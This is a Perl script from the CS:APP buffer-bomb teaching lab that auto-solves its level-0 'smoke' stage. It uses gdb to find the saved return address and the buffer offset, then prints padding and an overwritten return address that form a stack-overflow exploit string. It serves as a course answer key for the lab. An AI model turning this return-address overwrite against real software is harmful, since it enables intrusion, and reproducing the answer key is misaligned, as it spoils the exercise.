#!/usr/bin/perl 
#######################################################################
# smoke.pl - automatically solves buffer bomb for candle level (0)
#
# Copyright (c) 2002-2011, R. Bryant and D. O'Hallaron, All rights reserved.
#######################################################################

use strict;
use Getopt::Std;
use lib ".";
use Solve;

$| = 1; # autoflush output on every print statement

# ---------------------------------------------------------------------
#
# Step 1: Initialize script
#
# ---------------------------------------------------------------------

#
# usage - print help message and terminate
#
sub usage 
{
    printf STDERR "$_[0]\n";
    printf STDERR "Usage: $0 [-h] -u <userid>\n";
    printf STDERR "  -u <userid>   Userid\n";
    printf STDERR "  -h            Print this message\n";
    die "\n";
}

my $flags;
my $gdbfile;
my $userid;
my $gdbout;
my $smoke;
my $padcount;
my $i;


$flags = "";

no strict;
getopts('hsu:');
if ($opt_h) {
    usage();
}

if (!$opt_u) {
    usage("Missing userid name (-u)\n");
}

if ($opt_s) {
    $flags = "-s";
}

$userid = $opt_u;
use strict 'vars';


# ---------------------------------------------------------------------
#
# Step 2: Generate a gdb command file
#
# ---------------------------------------------------------------------

$gdbfile = "smoke.gdb";
open(GDB, ">$gdbfile") || die "Can't open GDB file $gdbfile\n";

print GDB <<GDBSTUFF;
break getbuf
break Gets
run -u $userid
print /a \$ebp+4
continue
print /a *(void**)(\$ebp+8)
print /a (void*)smoke
quit
GDBSTUFF

close GDB;

# ---------------------------------------------------------------------
#
# Step 3: Run gdb with command file to extract runtime info about the
# bomb.
#
# ---------------------------------------------------------------------


$gdbout = `gdb -nw $Solve::EXECUTABLE -x $gdbfile | grep \"[0-9] = \"`
    || die "Couldn't run gdb with batch file $gdbfile\n";


# ---------------------------------------------------------------------
#
# Step 4: Parse gdb output to get offsets.
#
# ---------------------------------------------------------------------

$gdbout =~ s/\$[0-9]* = //g;

my ($return_address_location,
    $buf_location,
    $smoke_address) = split(/\n/, $gdbout);

my $padcount = hex($return_address_location) - hex($buf_location);

print "/* getbuf return address at address: $return_address_location */\n";
print "/* Local buffer starts at address:   $buf_location */\n";
print "/* Padding required:                 $padcount bytes */\n";
print "\n";


# generate padding

for ($i = 0; $i < $padcount; $i++) {
    print "00 ";
}
print "\n";

# generate return address in little endian order

$a = hex($smoke_address);

printf("/* smoke() located at: 0x%08x */\n",
       $a);

printf("%.2x %.2x %.2x %.2x\n",
       ($a >>  0) & 0xFF,
       ($a >>  8) & 0xFF,
       ($a >> 16) & 0xFF,
       ($a >> 24) & 0xFF,
       );

